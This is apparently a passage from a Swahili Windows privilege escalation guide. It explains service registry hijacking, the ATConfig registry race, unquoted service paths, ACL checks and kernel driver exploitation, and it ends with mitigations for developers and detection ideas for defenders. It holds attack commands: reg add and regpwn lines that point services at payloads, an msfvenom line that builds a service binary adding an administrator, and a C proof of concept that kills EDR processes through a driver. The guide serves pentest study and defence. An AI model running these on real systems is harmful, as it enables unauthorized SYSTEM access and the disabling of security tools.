Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za kuandika kwenye registry key ya huduma husika. Entry ya ACL pekee haithibitishi ufikiaji halisi: entries za deny, token ya sasa, na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za `SERVICE_CHANGE_CONFIG` na `SERVICE_START` za service object. Escalation pia inahitaji sehemu inayoweza kutumika ya usanidi wa huduma, njia ya kuwasha huduma, na identity ya huduma yenye ruhusa za juu zaidi. Angalia [haki za registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) za Microsoft na [marejeleo ya haki za ufikiaji wa huduma](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mashindano ya symlink ya Registry hadi kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Accessibility vya Windows huunda funguo za **ATConfig** za kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** hadi kwenye ufunguo wa session wa HKLM. **Symbolic link race** ya Registry inaweza kuelekeza uandishi huo wenye mapendeleo ya juu kwenye **njia yoyote ya HKLM**, na kuwezesha kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop na mtumiaji anaweza kuiandika.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure-desktop (kwa mfano, **LockWorkstation**), kunakoanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapotokea, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengwa la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa.

Baada ya kupata uwezo wa kuandika thamani yoyote ya HKLM, geukia LPE kwa kubadilisha thamani za usanidi wa service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) kisha uiwashe baada ya uandishi. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa upande wa Windows services, hii **inatosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za kunukuu, Windows itajaribu kutekeleza kila sehemu ya path inayoishia kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizo na alama za kunukuu, ukiondoa zile za huduma zilizojengewa ndani za Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia** vulnerability hii kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya service wewe mwenyewe kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda privilege escalation ikawezekana. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili lengwa za script za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **action arguments** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa hoja ya faili iliyobainishwa wazi ya interpreter, kama PowerShell `-File`. Ikiwa faili ya batch ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; vigezo, masharti, na uunganishaji wa shell huhitaji ufuatiliaji wa mikono. Script au parent directory inayoweza kuandikwa na mtumiaji ni dalili ya utekelezaji kati ya akaunti tu ikiwa principal ya task iliyosanidiwa ni tofauti na ya mtumiaji anayeita, na task inafikia action hiyo. ACL ya append-only inaweza kuwa muhimu kwa script, lakini `exit` inayotokea mapema au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger, na sera ya udhibiti wa programu kabla ya kudai kuwa privilege escalation inawezekana. Orodhesha tu; usibadilishe script wala kuanzisha task.

## Named streams kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayosomeka inaweza kuwa na stream ya `:$DATA` yenye jina, ambayo maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya directory. Kwa seti ndogo na husika ya backup au faili za usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa stream kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa na siri ni dalili tu. Kagua ruhusa halisi ya kusoma faili, ikiwa filesystem inatumia streams, ikiwa stream ina credentials zinazoweza kutumika, na akaunti ambayo credentials hizo huithibitisha. Epuka kuchanganua streams kwa kujirudia na kuchapisha maudhui ya streams wakati wa uorodheshaji wa kawaida.

## Ingizo za helper za Windows Driver Kit zinazoendeshwa kwa ratiba

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia `command.txt`, `reboot.rsf`, na faili ya mradi `working\rsf.rsf` kutoka kwenye run directory yake. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye privileged inaweza kutumia ruhusa ya kuandika ya kiwango cha chini kwenye ingizo hizo kusababisha command execution katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye privileged anayezitumia na kwamba **faili zote mbili** za sidecar zinaweza kuundwa au kurekebishwa; kuipata helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia mbili za sidecar. Ikiwa task haibainishi working directory, directory ya executable ni dalili tu ya kuthibitisha, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la faili ya mradi inayotumika pia lazima litimizwe. Kagua principal halisi ya task badala ya kudhani inaendeshwa kama SYSTEM.

## Applications

### Applications Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda unaweza kubadilisha mojawapo na kupandisha privileges) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha Windows agent ya Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri matoleo ya zamani ya Checkmk Windows agents ambazo ziliandika command files kwenye `C:\Windows\Temp` kisha kutekeleza faili lililokuwepo tayari na lililolindwa dhidi ya kuandikwa, baada ya kushindwa kulibadilisha. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama operesheni ya agent iliyoathiriwa inaweza kutekelezwa; lebo ya branch pekee, kama `2.1`, haiwezi kuthibitisha kuwepo kwa hatari. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha agent commands.

#### Ukaguzi wa service ya ADSelfService Plus SAML

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na za awali; vendor alirekebisha tatizo hili katika build 6211. Linahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni kiashiria cha kufuatilia, si hitimisho la kuwepo kwa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service hiyo. Code execution kupitia service hurithi ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayoweza kusomwa kwenye saraka ya Backup ya bidhaa ni kiashiria tofauti cha backup iliyosimbwa, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa enumeration ya kawaida.

#### Jenkins controller na mipaka ya akaunti za domain

Kwenye Jenkins controller ya Windows, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiendesha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata za `JENKINS_HOME`: Jenkins huhifadhi taarifa za credential na encryption keys kwenye `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([hifadhi ya siri za Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwa faili hizi pekee hakufichui password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha siri kwenye output inayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user object, thibitisha kuwa script path inaweza kuandikwa na kuna logon halisi au scheduled consumer inayoendeshwa kama user lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji uthibitishaji tofauti wa ruhusa halisi za AD.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuianzisha kwa kuiweka kwenye queue** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye ruhusa za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye Windows agent inayojisimamia, step hiyo hutekelezwa kama [akaunti ya operating system iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline husika, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa service ya agent kabla ya kudai kuwa kuna mabadiliko ya ruhusa kati ya watumiaji au kwenda SYSTEM. Agent iliyosakinishwa, role ya mradi, au ruhusa ya kuandika kwenye repository pekee ni viashiria tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft inatofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **akaunti ya service ya ADSync**, inayoendesha service ya synchronization na kufikia database yake ya SQL, na **akaunti ya AD DS connector**, ambayo ruhusa zake kwenye directory hutegemea vipengele vya sync vilivyosakinishwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa kwenye database hiyo, huku key material [ikilindwa na DPAPI chini ya akaunti ya service ya ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Kuwepo kwa sync service iliyosakinishwa, group yenye jina linalodokeza kuwa ni ya local administrator, au kuonekana kwa database pekee hakuthibitishi kuwa credential inaweza kusimbuliwa au kuwa kuna njia ya kuongeza ruhusa kwenye domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, muundo wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na ruhusa halisi za utambulisho huo kwenye AD. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na ufikiaji pekee, bila kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za support DLL za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia kwenye print process yenye ruhusa za juu zaidi. Kagua saraka halisi ya driver na ACLs za DLL, pamoja na saraka za parent na reparse points, hata kama enumeration ya printer kupitia WMI imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza kupakiwa kwa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kiashiria tu: thibitisha ruhusa halisi ya kuandika baada ya kuzingatia deny entries, kwamba driver husika imesakinishwa na inapakia faili hilo chini ya utambulisho wenye ruhusa za juu, na kama driver iliyosasishwa ya vendor au security program yake imerekebisha usakinishaji. Usihitimishe kuwa kuna vulnerability kwa kutegemea jina la saraka au version ya driver pekee.

### Ruhusa za Kuandika

Kagua kama unaweza kurekebisha config file ili kusoma faili maalum au kama unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu za folder/file kwenye mfumo ni kufanya hivi:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Uendelevu/utekelezaji kupitia upakiaji-otomatiki wa plugin za Notepad++

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda zake ndogo za `plugins`. Ikiwa kuna usakinishaji wa portable/nakala unaoweza kuandikwa, kuweka plugin hasidi husababisha code execution kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kupitia `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuwasha

**Angalia kama unaweza kubadilisha baadhi ya registry au binary itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns yanayovutia kwa ajili ya privilege escalation**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazowezekana za **third-party zisizo za kawaida/zilizo hatarishi**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inatoa primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupandisha priviliji kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kwa hitilafu za race-condition ambapo mwito ulio hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, unaweza kurefusha muda wa lookup kwa makusudi (kwa kutumia sehemu zenye urefu wa juu zaidi au minyororo mirefu ya saraka) ili kuongeza dirisha kutoka mikrosekunde hadi makumi ya mikrosekunde:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF za cancel-safe queue, ufichuaji wa paged-pool, na pivots za I/O ring

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kutokana na hitilafu mbili dhaifu kila moja kivyake: **race ya muda wa uhai wa cancel-safe queue** inayofuta ombi/CBD huku lock ya queue ikiwa bado imeshikiliwa, na ufichuaji wa **kuachilia lock kabla ya kunakili** unaovuja allocation ya paged-pool iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Kufuta huku lock imeshikiliwa + kughairi baadaye**: tafuta njia ya mafanikio inayofanya **Acquire -> CompleteRequest/free -> Release**, huku njia ya kughairi ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia lock ya CBDQ/CSQ, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwenye callback ya remove ya driver.
- **Reclaim kipengee cha queue kilichofutwa** kwa allocation ya paged-pool inayodhibitiwa na mshambuliaji na yenye ukubwa sawa. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na baadaye unaweza kuvichunguza kwa operesheni za pipe read/peek. Ikiwa kipengee kilichofutwa kina list links ndani yake, zifute kwa **orodha ya mzunguko ya nodi bandia za ombi zilizo kwenye user memory** ili driver ichakate tena na tena miundo ya ombi iliyofafanuliwa na mshambuliaji badala ya kusimama kwenye kichwa cha awali cha orodha.
- **Boresha write inayotabirika**: ikiwa ombi bandia linaelekeza upya pointer ya context iliyopachikwa inayotumiwa na writes za bookkeeping (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata **write inayodhibiti anwani lakini si thamani**. Katika hali hiyo, lenga sehemu ya **length/size** ya object ya pool iliyosambazwa badala ya pointer ya mwisho ya code/data, kisha kagua objects zilizosambazwa hadi ile iliyoharibika ikupe **usomaji wa paged-pool nje ya mipaka**.
- **Muundo wa ufichuaji unaoweza kuathiriwa na race**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka ikiwa mshambuliaji anaweza kupanua buffer inayokopiwa (kwa mfano, kwa kuongeza maingizo mengi ya list/resource yanayoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu huongeza muda wa kubadilisha allocation bila kusababisha mashine ku-crash.
- **Malengo ya kujaza upya yaliyo na pointer nyingi**: arrays za registered-buffer za Windows **I/O ring** ni malengo bora ya ufichuaji kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`), na kila kipengee ni pointer ya kernel kwenda kwa `_IOP_MC_BUFFER_ENTRY`. Vuja moja ya arrays hizi, pata upya `IORING_OBJECT` iliyoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili operesheni za baadaye za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa usomaji/uandikaji holela wa kernel. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **writes zinazopishana na zisizolingana** kujenga pointer ya user yenye byte inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha weka array ya registered-buffer iliyoghushiwa hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Mara tu unapopata arbitrary kernel read/write kupitia I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption kwenye registry hive

Vulnerabilities za kisasa za hive hukuwezesha kupanga layout zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha uharibifu wa metadata kuwa overflows za kernel paged-pool bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya `RtlQueryRegistryValues` direct-mode kupitia paths zinazodhibitiwa na attacker

Baadhi ya drivers hukubali registry path kutoka userland, hukagua tu kwamba ni string halali ya UTF-16, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` ikiwa na `RTL_QUERY_REGISTRY_DIRECT` kuelekeza matokeo kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii hutengeneza primitives mbili zenye manufaa:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path ya absolute ya `\Registry\...` inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na attacker, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa vibaya kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya vitendo vya exploitation:

- **Windows 8+ mitigation**: ikiwa query inagusa **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability ibaki, tafuta **keys zinazoweza kuandikwa na attacker ndani ya system hives zinazoaminika** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha descendants za `\Registry\Machine` zinazoweza kuandikwa, kisha endesha scan tena kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazofikiwa kutoka kwenye sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direct write ya byte 8 ndani ya `int` ya byte 4 huharibu data iliyo karibu kwenye stack na inaweza kuandika sehemu tu ya callback/function pointer iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack, kisha itatumia tena buffer hiyo hiyo kusoma string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa kiasi pointer ya `Buffer`, hivyo kusababisha kernel write inayodhibitiwa kwa sehemu.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambulizi kwenye scalar iliyotumiwa tena, query inayofuata ya `REG_BINARY` hunakili bytes za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu. Mara nyingi hii ndiyo njia iliyo wazi zaidi ya kuandika upya callback pointer kikamilifu.

Muundo thabiti wa kutafuta: **usomaji wa registry wa aina tofauti kwenye variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za code ambako usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia kutokuwepo kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizosainiwa huunda device object yao kwa SDDL thabiti kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, secure DACL haitekelezwi kifaa kinapofunguliwa kupitia path iliyo na component ya ziada, hivyo mtumiaji yeyote asiye na priviliji anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishaweza kufungua kifaa, IOCTLs zenye priviliji zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo ulioonekana kwenye mazingira halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zozote (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vizuizi (tampering ukiwa offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, zikiwemo Protected Process/Light (PP/PPL), na hivyo kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo mdogo wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila mara unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa shughuli zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au urejeshaji wa handle.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa ingizo) na uzingatie mifumo ya broker badala ya privileges za kernel za moja kwa moja.

Mawazo ya detection kwa defenders
- Fuatilia ufunguaji wa device names zinazotiliwa shaka kutoka user-mode (k.m., \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
